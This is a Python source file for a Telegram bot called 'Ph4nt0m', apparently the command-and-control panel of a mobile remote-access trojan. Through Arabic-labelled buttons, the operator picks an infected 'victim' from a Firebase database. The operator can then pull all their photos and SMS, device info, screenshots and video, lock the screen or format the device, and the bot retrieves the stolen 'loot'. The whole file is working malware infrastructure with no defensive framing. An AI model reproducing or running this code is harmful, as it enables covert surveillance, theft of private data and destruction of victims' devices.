#!/usr/bin/env python3
import os, json, threading, time, requests, base64
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from firebase_admin import credentials, initialize_app, db

flask_app = Flask(__name__)
@flask_app.route('/')
def home(): return "System Active"

def run_flask():
    flask_app.run(host='0.0.0.0', port=int(os.environ.get("PORT",8000)))

BOT_TOKEN = os.environ["BOT_TOKEN"]
FIREBASE_URL = os.environ["FIREBASE_URL"]
if os.environ.get("FIREBASE_CREDS"):
    cred = credentials.Certificate(json.loads(os.environ["FIREBASE_CREDS"]))
    initialize_app(cred, {'databaseURL': FIREBASE_URL})
else:
    initialize_app(options={'databaseURL': FIREBASE_URL})

victims_ref = db.reference('victims')
current_victim = {}

def get_victims():
    s = victims_ref.get()
    return {k:v for k,v in (s or {}).items() if v.get('online')}

async def send_file(update, data, name, caption):
    try: await update.message.reply_document(document=data, filename=name, caption=caption)
    except: pass

async def send_loot(update, vid):
    loot = db.reference(f'victims/{vid}/loot').get()
    if not loot: await update.message.reply_text("لا شيء"); return
    items = sorted(loot.items(), key=lambda x: x[1].get('ts',0))[-5:]
    for k, item in items:
        t, n, u, info = item.get('type'), item.get('name',''), item.get('url'), item.get('info')
        if info:
            await update.message.reply_text(str(info)[:4000])
        elif u:
            try:
                r = requests.get(u)
                if r.status_code==200:
                    ext = 'png' if t in ('screenshot','photo') else 'webm' if t=='video' else 'bin'
                    await send_file(update, r.content, f"{n}.{ext}", f"📎 {n}")
            except: pass

def main_menu(vid):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📷 سحب كل الصور", callback_data='get_all_photos')],
        [InlineKeyboardButton("💬 سحب SMS", callback_data='get_all_sms')],
        [InlineKeyboardButton("📋 معلومات الجهاز", callback_data='get_device_info')],
        [InlineKeyboardButton("🖼️ لقطة شاشة", callback_data='screenshot'),
         InlineKeyboardButton("🎥 فيديو", callback_data='record_video')],
        [InlineKeyboardButton("📳 اهتزاز", callback_data='vibrate'),
         InlineKeyboardButton("🔊 صوت", callback_data='play_sound')],
        [InlineKeyboardButton("🔦 فلاش ON", callback_data='flash_on'),
         InlineKeyboardButton("💡 فلاش OFF", callback_data='flash_off')],
        [InlineKeyboardButton("🔔 إشعار", callback_data='send_notification')],
        [InlineKeyboardButton("🔒 قفل", callback_data='lock_screen')],
        [InlineKeyboardButton("💣 فرمتة", callback_data='format'),
         InlineKeyboardButton("🚫 مسح", callback_data='leave')],
        [InlineKeyboardButton("🔙 رجوع", callback_data='back')]
    ])

async def start(update, context):
    await update.message.reply_text("⚡ Ph4nt0m", reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("📟 الضحايا", callback_data='list')]
    ]))

async def handle(update, context):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data

    if data in ('list','back'):
        v = get_victims()
        if not v:
            await q.edit_message_text("لا أجهزة", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄", callback_data='list')]]))
            return
        kb = [[InlineKeyboardButton(f"🖥 {vid}", callback_data=f'sel_{vid}')] for vid in v]
        kb.append([InlineKeyboardButton("🗑️ مسح الكل", callback_data='del_all')])
        await q.edit_message_text("اختر:", reply_markup=InlineKeyboardMarkup(kb))
        return
    if data == 'del_all':
        victims_ref.delete()
        await q.edit_message_text("تم", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📟", callback_data='list')]]))
        return
    if data.startswith('sel_'):
        vid = data[4:]
        if vid not in get_victims():
            await q.edit_message_text("غير متصل", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄", callback_data='list')]]))
            return
        current_victim[uid] = vid
        await q.edit_message_text(f"✅ {vid}", reply_markup=main_menu(vid))
        return
    vid = current_victim.get(uid)
    if not vid:
        await q.edit_message_text("اختر ضحية", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📟", callback_data='list')]]))
        return
    if data == 'leave':
        victims_ref.child(vid).delete()
        del current_victim[uid]
        await q.edit_message_text("تم", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📟", callback_data='list')]]))
        return

    # الأوامر
    cmd = {"action": data}
    db.reference(f'victims/{vid}/command').set(cmd)
    await q.edit_message_text(f"✅ {data}", reply_markup=main_menu(vid))
    time.sleep(3)
    if data in ('get_all_photos','get_all_sms','get_device_info','screenshot'):
        await send_loot(q, vid)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle))
    print("🤖 Ready")
    app.run_polling()

if __name__=="__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    main()
